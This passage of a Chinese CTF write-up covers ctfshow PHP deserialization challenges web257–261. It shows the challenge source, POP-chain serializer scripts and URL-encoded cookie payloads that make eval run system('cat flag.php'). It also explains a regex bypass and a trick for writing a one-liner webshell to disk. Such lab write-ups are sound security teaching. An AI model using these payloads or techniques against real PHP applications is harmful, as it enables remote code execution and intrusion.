class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];</span><br><span class="language-php"><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;</span><br><span class="language-php">    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);</span><br><span class="language-php">    <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure><p>代码审计，魔法函数_construct当对象被创建的时候自动调用，对对象进行初始化，当所有的操作执行完毕之后，需要释放序列化的对象，触发_destruct()魔术方法</p><p>因此我们只需要在执行_construct()的时候初始化backDoor类，方便我们进行命令执行的利用，之后反序列化结束后，会执行_destruct(),此时eval($this-&gt;code);等价于eval(system(‘cat flag.php’);)</p><p>因此为了实现这个目的首先去掉我们不需要的info类，下面<br>构造pop链(由于配上private有特殊不可见字符不想手动处理所以进行url编码)</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php">&#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>()));</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=xxxxxx&amp;password=xxxxxx<br><span class="hljs-attribute">Cookie</span>:user=O%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ctfShowUser%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A21%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>ctfShowUser%<span class="hljs-number">00</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxxxxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A21%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>ctfShowUser%<span class="hljs-number">00</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxxxxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>ctfShowUser%<span class="hljs-number">00</span>isVip%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>ctfShowUser%<span class="hljs-number">00</span>class%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>backDoor%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>backDoor%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A23%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>cat+flag.php%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> ctfShowUser&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> function __construct()&#123;<br>        <span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">class</span>=new info();<br>    &#125;<br>    <span class="hljs-keyword">public</span> function login(<span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> function __destruct()&#123;<br>        <span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">class</span>-&gt;getInfo();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> info&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> function getInfo()&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> backDoor&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> function getInfo()&#123;<br>        eval(<span class="hljs-variable">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$username</span>) &amp;&amp; isset(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>多了一个正则匹配<br><code>if(!preg_match(&#39;/[oc]:\d+:/i&#39;, $_COOKIE[&#39;user&#39;]))</code><br>意思为过滤<strong>O：数字</strong><br>这种情况可用+绕过，如：O:+</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php">&#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>());</span><br><span class="language-php"><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:&#x27;</span>,<span class="hljs-string">&#x27;O:+&#x27;</span>,<span class="hljs-variable">$a</span>);</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?username<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;password<span class="hljs-operator">=</span><span class="hljs-number">1</span><br>Cookie:user<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>B<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ctfShowUser<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>username<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>xxxxxx<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>password<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>xxxxxx<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>isVip<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bb<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>class<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>B<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>backDoor<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>code<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">23</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>system<span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>cat+flag.php<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctfshow&#x27;</span>])))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>正则匹配,直接输出flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;ctfshow_i_love_36D&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br><br></code></pre></td></tr></table></figure><h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowvip</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username!=<span class="hljs-string">&#x27;&#x27;</span> || <span class="hljs-variable language_">$this</span>-&gt;password!=<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;code = <span class="hljs-variable language_">$this</span>-&gt;username.<span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;code==<span class="hljs-number">0x36d</span>)&#123;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-variable">$this</span>-&gt;password);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;vip&#x27;</span>]); <br></code></pre></td></tr></table></figure><p>当code&#x3D;&#x3D;0x36d(877)，就可以写入文件</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;code==<span class="hljs-number">0x36d</span>)&#123;<br>            file_put_contents($<span class="hljs-keyword">this</span>-&gt;username, $<span class="hljs-keyword">this</span>-&gt;password);<br>        &#125; <br></code></pre></td></tr></table></figure><p>code的值在反序列化的时候传入，所以username应该为877+非数字，这样就满足<code>$this-&gt;code==0x36d</code>条件了,弱比较877&#x3D;&#x3D;877.php为真，username可以写成php，和passowrd写成一句话木马,</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function __unserialize($<span class="hljs-keyword">data</span>)&#123;<br>        $<span class="hljs-keyword">this</span>-&gt;username=$<span class="hljs-keyword">data</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        $<span class="hljs-keyword">this</span>-&gt;password=$<span class="hljs-keyword">data</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>        $<span class="hljs-keyword">this</span>-&gt;code = $<span class="hljs-keyword">this</span>-&gt;username.$<span class="hljs-keyword">this</span>-&gt;password;<br>    &#125; <br></code></pre></td></tr></table></figure><p>PHP7.4.0+版本，如果类中同时定义了_unserialize()和_wakeup()两个魔术方法，则只有_unserialize()方法会生效，_wakeup()方法会忽略</p><p>构造username和password的值把shell写入文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 